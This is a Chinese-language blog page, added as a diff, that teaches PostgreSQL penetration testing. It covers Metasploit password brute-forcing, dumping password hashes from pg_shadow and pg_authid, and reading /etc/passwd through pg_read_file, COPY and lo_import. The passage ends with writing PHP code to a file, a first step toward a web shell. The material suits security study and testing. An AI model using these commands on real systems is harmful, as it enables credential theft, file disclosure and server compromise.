@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-serif-sc@5.0.0/700.css"><link rel="stylesheet" href="/assets/theme.css?v=7e48d4fc"><script defer src="/assets/app.js?v=7e48d4fc"></script>
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/237383456?v=4&size=200"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="命令行连接方式
+
+安装客户端
+
+```bash
+apt install postgresql-client
+```
+
+连接方式
+
+```bash
+psql -U postgres -p port -h ip -W -d postgres
+```
+
+-U 指定用户名
+
+-d 指定连接的数据库，postgresql连接必须指定数据库
+
+-h 远程连接ip
+
+-p 远程连接端口
+
+-W 指定终端提示符下输入密码
+
+## Postgresql攻击方式
+
+## Postgresql口令爆破
+
+msf模块 auxiliary/scanner/postgres/postgres_login
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0046bf52890.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7266d9360567.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fce343e40af.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fafbe1d9858.png)
+
+你的暴力破解**整体完成了**
+
+找到了 **1 组有效的账号密码**
+
+Metasploit 提示你可以用这组凭据创建一个 Postgres 会话（连接）
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png)
+
+## Postgresql信息收集
+
+使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集
+
+```sql
+-- 详细信息 
+select version();
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png)
+
+```sql
+-- 版本信息 
+show server_version;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png)
+
+```sql
+select pg_read_file('PG_VERSION', 0, 200);
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png)
+
+```sql
+-- 数字版本信息包括小版号 
+SHOW server_version_num;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png)
+
+```sql
+SELECT current_setting('server_version_num');
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png)
+
+```sql
+-- 获取 pgsql 安装目录 
+select setting from pg_settings where name = 'data_directory'; 
+-- 查找 pgsql 配置文件路径 
+select setting from pg_settings where name='config_file' 
+-- 列出数据库 
+SELECT datname FROM pg_database; 
+-- 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） 
+select inet_server_addr();
+-- 查看当前用户是不是管理员权限 on 代表是, off 代表不是 
+SELECT current_setting('is_superuser'); 
+-- 查询密码（印证了之前的说法 postgres用户没有设置密码） 
+SELECT usename, passwd FROM pg_shadow; 
+SELECT rolname,rolpassword FROM pg_authid;
+-- 查询当前的加密方式 
+SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
+```
+
+## Postgresql读文件
+
+## pg_read_file
+
+```sql
+select pg_read_file('/etc/passwd'); 
+select/**/PG_READ_FILE($$/etc/passwd$$);
+```
+
+```
+在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
+```
+
+## copy_from
+
+copy有两个命令：COPY FROM和COPY TO。">
+<meta property="og:title" content="PostgreSQL数据库渗透">
+<meta property="og:description" content="命令行连接方式
+
+安装客户端
+
+```bash
+apt install postgresql-client
+```
+
+连接方式
+
+```bash
+psql -U postgres -p port -h ip -W -d postgres
+```
+
+-U 指定用户名
+
+-d 指定连接的数据库，postgresql连接必须指定数据库
+
+-h 远程连接ip
+
+-p 远程连接端口
+
+-W 指定终端提示符下输入密码
+
+## Postgresql攻击方式
+
+## Postgresql口令爆破
+
+msf模块 auxiliary/scanner/postgres/postgres_login
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0046bf52890.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7266d9360567.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fce343e40af.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fafbe1d9858.png)
+
+你的暴力破解**整体完成了**
+
+找到了 **1 组有效的账号密码**
+
+Metasploit 提示你可以用这组凭据创建一个 Postgres 会话（连接）
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png)
+
+## Postgresql信息收集
+
+使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集
+
+```sql
+-- 详细信息 
+select version();
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png)
+
+```sql
+-- 版本信息 
+show server_version;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png)
+
+```sql
+select pg_read_file('PG_VERSION', 0, 200);
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png)
+
+```sql
+-- 数字版本信息包括小版号 
+SHOW server_version_num;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png)
+
+```sql
+SELECT current_setting('server_version_num');
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png)
+
+```sql
+-- 获取 pgsql 安装目录 
+select setting from pg_settings where name = 'data_directory'; 
+-- 查找 pgsql 配置文件路径 
+select setting from pg_settings where name='config_file' 
+-- 列出数据库 
+SELECT datname FROM pg_database; 
+-- 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） 
+select inet_server_addr();
+-- 查看当前用户是不是管理员权限 on 代表是, off 代表不是 
+SELECT current_setting('is_superuser'); 
+-- 查询密码（印证了之前的说法 postgres用户没有设置密码） 
+SELECT usename, passwd FROM pg_shadow; 
+SELECT rolname,rolpassword FROM pg_authid;
+-- 查询当前的加密方式 
+SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
+```
+
+## Postgresql读文件
+
+## pg_read_file
+
+```sql
+select pg_read_file('/etc/passwd'); 
+select/**/PG_READ_FILE($$/etc/passwd$$);
+```
+
+```
+在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
+```
+
+## copy_from
+
+copy有两个命令：COPY FROM和COPY TO。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/237383456?v=4&size=200">
+<title>PostgreSQL数据库渗透</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">PostgreSQL数据库渗透</h1>
+<div class="title-right">
+    <a href="https://P7IVESC.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/P7IVESC/P7IVESC.github.io/issues/11" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>命令行连接方式</p>
+<p>安装客户端</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">apt install postgresql-client</pre></div>
+<p>连接方式</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">psql -U postgres -p port -h ip -W -d postgres</pre></div>
+<p>-U 指定用户名</p>
+<p>-d 指定连接的数据库，postgresql连接必须指定数据库</p>
+<p>-h 远程连接ip</p>
+<p>-p 远程连接端口</p>
+<p>-W 指定终端提示符下输入密码</p>
+<h2>Postgresql攻击方式</h2>
+<h2>Postgresql口令爆破</h2>
+<p>msf模块 auxiliary/scanner/postgres/postgres_login</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81f6b72140667845b5bd61f4dcc49b5d4dbe75343c21e4b6602cfe49521fdfa9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330303436626635323839302e706e67"><img src="https://camo.githubusercontent.com/81f6b72140667845b5bd61f4dcc49b5d4dbe75343c21e4b6602cfe49521fdfa9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330303436626635323839302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0046bf52890.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/109843a377fb174721ca056428ea3c3eeed1aab8453632d2ecb0aff308e817e0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3732363664393336303536372e706e67"><img src="https://camo.githubusercontent.com/109843a377fb174721ca056428ea3c3eeed1aab8453632d2ecb0aff308e817e0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3732363664393336303536372e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7266d9360567.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/80570e7d359603c6858b7b46c086aebb782b76f6d7d086dab6602902b8db8146/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3966636533343365343061662e706e67"><img src="https://camo.githubusercontent.com/80570e7d359603c6858b7b46c086aebb782b76f6d7d086dab6602902b8db8146/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3966636533343365343061662e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fce343e40af.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e14f797a09e3c604042ebf1c3d6147dd7a550bd26eaefcc160bda7f5acd385cb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3066616662653164393835382e706e67"><img src="https://camo.githubusercontent.com/e14f797a09e3c604042ebf1c3d6147dd7a550bd26eaefcc160bda7f5acd385cb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3066616662653164393835382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fafbe1d9858.png" style="max-width: 100%;"></a></p>
+<p>你的暴力破解<strong>整体完成了</strong></p>
+<p>找到了 <strong>1 组有效的账号密码</strong></p>
+<p>Metasploit 提示你可以用这组凭据创建一个 Postgres 会话（连接）</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ff96a0c46dff0d9b1d892422f6d711146133e6a0aea2266d4a27dd427a12fe89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3663386162636163663261642e706e67"><img src="https://camo.githubusercontent.com/ff96a0c46dff0d9b1d892422f6d711146133e6a0aea2266d4a27dd427a12fe89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3663386162636163663261642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png" style="max-width: 100%;"></a></p>
+<h2>Postgresql信息收集</h2>
+<p>使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 详细信息 </span>
+<span class="pl-k">select</span> version();</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ce94315df566ef74ae67fcf3b9d9836433b33502a970d564b20c507fa902aa2f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6163623637343364636434312e706e67"><img src="https://camo.githubusercontent.com/ce94315df566ef74ae67fcf3b9d9836433b33502a970d564b20c507fa902aa2f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6163623637343364636434312e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 版本信息 </span>
+show server_version;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7a607dfd89215aa4fd493d1e2d917e10118b8018e8212f46f800e150b18f785b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6238313863633637383532302e706e67"><img src="https://camo.githubusercontent.com/7a607dfd89215aa4fd493d1e2d917e10118b8018e8212f46f800e150b18f785b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6238313863633637383532302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>PG_VERSION<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>, <span class="pl-c1">200</span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/18b54cbd41c80c9fd022f4ef2855d51a2683e09b44b180267b5a3cafa1d759cd/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262323334616562356363612e706e67"><img src="https://camo.githubusercontent.com/18b54cbd41c80c9fd022f4ef2855d51a2683e09b44b180267b5a3cafa1d759cd/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262323334616562356363612e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 数字版本信息包括小版号 </span>
+SHOW server_version_num;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ac86584b52ac8ec80814a43a347cffdc95ace1fdcae250490486c9283f82aecb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632396331393961623333342e706e67"><img src="https://camo.githubusercontent.com/ac86584b52ac8ec80814a43a347cffdc95ace1fdcae250490486c9283f82aecb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632396331393961623333342e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> current_setting(<span class="pl-s"><span class="pl-pds">'</span>server_version_num<span class="pl-pds">'</span></span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/af930d0c29513d8488f4a3af1fd5a55dbe819a2a2b46c878fcec5c6435351977/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6331303835303736393463652e706e67"><img src="https://camo.githubusercontent.com/af930d0c29513d8488f4a3af1fd5a55dbe819a2a2b46c878fcec5c6435351977/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6331303835303736393463652e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 获取 pgsql 安装目录 </span>
+<span class="pl-k">select</span> setting <span class="pl-k">from</span> pg_settings <span class="pl-k">where</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>data_directory<span class="pl-pds">'</span></span>; 
+<span class="pl-c"><span class="pl-c">--</span> 查找 pgsql 配置文件路径 </span>
+<span class="pl-k">select</span> setting <span class="pl-k">from</span> pg_settings <span class="pl-k">where</span> name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>config_file<span class="pl-pds">'</span></span> 
+<span class="pl-c"><span class="pl-c">--</span> 列出数据库 </span>
+<span class="pl-k">SELECT</span> datname <span class="pl-k">FROM</span> pg_database; 
+<span class="pl-c"><span class="pl-c">--</span> 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） </span>
+<span class="pl-k">select</span> inet_server_addr();
+<span class="pl-c"><span class="pl-c">--</span> 查看当前用户是不是管理员权限 on 代表是, off 代表不是 </span>
+<span class="pl-k">SELECT</span> current_setting(<span class="pl-s"><span class="pl-pds">'</span>is_superuser<span class="pl-pds">'</span></span>); 
+<span class="pl-c"><span class="pl-c">--</span> 查询密码（印证了之前的说法 postgres用户没有设置密码） </span>
+<span class="pl-k">SELECT</span> usename, passwd <span class="pl-k">FROM</span> pg_shadow; 
+<span class="pl-k">SELECT</span> rolname,rolpassword <span class="pl-k">FROM</span> pg_authid;
+<span class="pl-c"><span class="pl-c">--</span> 查询当前的加密方式 </span>
+<span class="pl-k">SELECT</span> name,setting,source,enumvals <span class="pl-k">FROM</span> pg_settings <span class="pl-k">WHERE</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>password_encryption<span class="pl-pds">'</span></span>;</pre></div>
+<h2>Postgresql读文件</h2>
+<h2>pg_read_file</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>); 
+<span class="pl-k">select</span><span class="pl-c"><span class="pl-c">/**/</span></span>PG_READ_FILE($$<span class="pl-k">/</span>etc<span class="pl-k">/</span>passwd$$);</pre></div>
+<pre class="notranslate"><code class="notranslate">在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
+</code></pre>
+<h2>copy_from</h2>
+<p>copy有两个命令：COPY FROM和COPY TO。</p>
+<p>COPY TO用于把一个表的内容复制到一个文件；COPY FROM用于从文件复制数据到表中。</p>
+<p>COPY TO中也可以指定查询，将查询结果写入文件。COPY FROM中文件的字段按照顺序写入到</p>
+<p>指定列中。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">DROP</span> <span class="pl-k">TABLE</span> IF EXISTS testf0x; 
+<span class="pl-k">create</span> <span class="pl-k">table</span> <span class="pl-en">testf0x</span>(t <span class="pl-k">TEXT</span>); 
+copy testf0x <span class="pl-k">from</span> <span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>; 
+<span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> testf0x;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c784995f0f53debda384d33e4dac0dae852c5494ba6a3949084334374437285f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6361353365373135386135372e706e67"><img src="https://camo.githubusercontent.com/c784995f0f53debda384d33e4dac0dae852c5494ba6a3949084334374437285f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6361353365373135386135372e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ca53e7158a57.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6ebf3ac39207d8906fe284992bb481c098aed5f52dddcfd272edb9b2fd7ca378/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6164643833336462666162352e77656270"><img src="https://camo.githubusercontent.com/6ebf3ac39207d8906fe284992bb481c098aed5f52dddcfd272edb9b2fd7ca378/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6164643833336462666162352e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/add833dbfab5.webp" style="max-width: 100%;"></a></p>
+<h2>lo_import</h2>
+<p>lo_import 是 PostgreSQL 内置函数，把服务器端文件导入为一个大对象（Large Object），存到系统表</p>
+<p>pg_largeobject 里。第二个参数 12345678 是手动指定的 OID（对象标识符），方便后续引用。执行完后</p>
+<p>/etc/passwd的内容就被存进数据库了。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> lo_import(<span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>,<span class="pl-c1">12345678</span>); 
+<span class="pl-c"><span class="pl-c">--</span> 直接读取 </span>
+<span class="pl-k">select</span> convert_from(lo_get(<span class="pl-c1">12345678</span>), <span class="pl-s"><span class="pl-pds">'</span>UTF8<span class="pl-pds">'</span></span>); 
+<span class="pl-c"><span class="pl-c">--</span> 报错带出 </span>
+<span class="pl-k">select</span> array_agg(b)::<span class="pl-k">text</span>::<span class="pl-k">int</span> <span class="pl-k">from</span>(<span class="pl-k">select</span> encode(data,<span class="pl-s"><span class="pl-pds">'</span>hex<span class="pl-pds">'</span></span>)b,pageno <span class="pl-k">from</span> pg_largeobject <span class="pl-k">where</span> loid<span class="pl-k">=</span><span class="pl-c1">12345678</span> <span class="pl-k">order by</span> pageno)a; 
+<span class="pl-c"><span class="pl-c">--</span> 删除对象 </span>
+<span class="pl-k">select</span> lo_unlink(<span class="pl-c1">12345678</span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/07940ee9cd0e705d43717f26e0d1aeabdc3ce0e3f2070f247f1fdda1e7ad8e18/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6133643632663563646233382e706e67"><img src="https://camo.githubusercontent.com/07940ee9cd0e705d43717f26e0d1aeabdc3ce0e3f2070f247f1fdda1e7ad8e18/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6133643632663563646233382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a3d62f5cdb38.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9b5785130b3c66a2e0c64becbf32948c5d9fde8f266a7160e1dcc672ef3c1cf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037383338623465303230642e706e67"><img src="https://camo.githubusercontent.com/9b5785130b3c66a2e0c64becbf32948c5d9fde8f266a7160e1dcc672ef3c1cf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037383338623465303230642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07838b4e020d.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ef1e4cc60944fdb885ae4d642d709c547f32fc7a31195c9893a6287ef0fd46d4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635656563656165316638332e77656270"><img src="https://camo.githubusercontent.com/ef1e4cc60944fdb885ae4d642d709c547f32fc7a31195c9893a6287ef0fd46d4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635656563656165316638332e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/65eeceae1f83.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/188eb1189375ce4a3aea0a8193cc2cd63aa522cf84456af76285cb0a719eff07/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334383166613232636233332e77656270"><img src="https://camo.githubusercontent.com/188eb1189375ce4a3aea0a8193cc2cd63aa522cf84456af76285cb0a719eff07/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334383166613232636233332e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3481fa22cb33.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/64efffac7e37f8ae87708fcbbc45cf50fac02e5ae82ae82e4b206ce8b6048b58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3338313335626534666464392e706e67"><img src="https://camo.githubusercontent.com/64efffac7e37f8ae87708fcbbc45cf50fac02e5ae82ae82e4b206ce8b6048b58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3338313335626534666464392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/38135be4fdd9.png" style="max-width: 100%;"></a></p>
+<h2>msf模块 auxiliary/admin/postgres/postgres_readfile</h2>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b9ef6863c95926822c0d275f1962e9f95c6eb7813fafa0383be523c8bc8af94c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3736306131646230366130312e77656270"><img src="https://camo.githubusercontent.com/b9ef6863c95926822c0d275f1962e9f95c6eb7813fafa0383be523c8bc8af94c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3736306131646230366130312e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/760a1db06a01.webp" style="max-width: 100%;"></a></p>
+<h2>Postgresql写文件</h2>
+<h2>copy命令</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">COPY (<span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;?php phpinfo();?&gt;<span class="pl-pds">'</span></span>) to <span class="pl-s"><span class="pl-pds">'</span>/tmp/1.php<span class="pl-pds">'</span></span>;</pre></div>
